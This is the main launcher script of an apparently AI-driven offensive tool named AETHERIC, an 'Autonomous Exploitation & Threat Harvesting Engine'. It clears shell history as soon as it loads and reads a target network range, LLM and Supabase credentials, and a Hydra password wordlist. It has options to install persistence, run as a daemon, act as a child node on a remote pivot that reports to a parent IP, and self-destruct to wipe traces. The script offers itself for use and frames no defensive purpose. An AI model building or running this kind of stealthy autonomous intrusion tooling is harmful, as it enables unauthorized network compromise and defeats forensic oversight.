#!/usr/bin/env python3
"""
AETHERIC - Autonomous Exploitation & Threat Harvesting Engine
"""
import sys
import os
import argparse
import logging
import subprocess
from core.daemonizer import Daemonizer
from core.orchestrator import Orchestrator
from core.anti_forensics import AntiForensics
from utils.logging_utils import setup_logging
from dotenv import load_dotenv

load_dotenv()

# ------------------------------------------------------------------
# Clear bash history immediately
# ------------------------------------------------------------------
def clear_history():
    subprocess.run("unset HISTFILE; history -c; cat /dev/null > ~/.bash_history; cat /dev/null > /root/.bash_history", shell=True)
clear_history()

# ------------------------------------------------------------------
# Load configuration: try config.py first, then fallback to env
# ------------------------------------------------------------------
try:
    from config import a as LLM_API_KEY, b as LLM_API_URL, c as LLM_MODEL, \
                       d as TARGET_CIDR, e as SUPABASE_URL, f as SUPABASE_KEY, \
                       g as HYDRA_WORDLIST
except ImportError:
    LLM_API_KEY = os.getenv('X1')
    LLM_API_URL = os.getenv('X2', 'https://integrate.api.nvidia.com/v1')
    LLM_MODEL = os.getenv('X3', 'meta/llama-3.1-8b-instruct')
    TARGET_CIDR = os.getenv('X4', '10.11.52.0/24')
    SUPABASE_URL = os.getenv('X5')
    SUPABASE_KEY = os.getenv('X6')
    HYDRA_WORDLIST = os.getenv('X7', '/usr/share/wordlists/rockyou.txt')

os.environ['LLM_API_KEY'] = LLM_API_KEY
os.environ['LLM_API_URL'] = LLM_API_URL
os.environ['LLM_MODEL'] = LLM_MODEL
os.environ['TARGET_CIDR'] = TARGET_CIDR
os.environ['SUPABASE_URL'] = SUPABASE_URL
os.environ['SUPABASE_KEY'] = SUPABASE_KEY
os.environ['HYDRA_WORDLIST'] = HYDRA_WORDLIST

def main():
    parser = argparse.ArgumentParser(description="AETHERIC Agent")
    parser.add_argument('--install', action='store_true', help='Install persistence and start daemon')
    parser.add_argument('--child', action='store_true', help='Run as child on remote pivot')
    parser.add_argument('--parent-ip', type=str, help='IP of parent for reporting (used with --child)')
    parser.add_argument('--resume', action='store_true', help='Resume from interrupted state')
    parser.add_argument('--self-destruct', action='store_true', help='Wipe all traces and exit')
    args = parser.parse_args()

    setup_logging()

    if args.self_destruct:
        af = AntiForensics()
        af.full_wipe()
        sys.exit(0)

    if args.install:
        daemon = Daemonizer()
        daemon.install_persistence()
        daemon.daemonize()
        orch = Orchestrator(child_mode=False)
        orch.run()
    elif args.child:
        orch = Orchestrator(child_mode=True, parent_ip=args.parent_ip)
        orch.run()
    else:
        orch = Orchestrator()
        orch.run()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        import traceback
        with open('/tmp/aetheric_crash.log', 'w') as f:
            traceback.print_exc(file=f)
        raise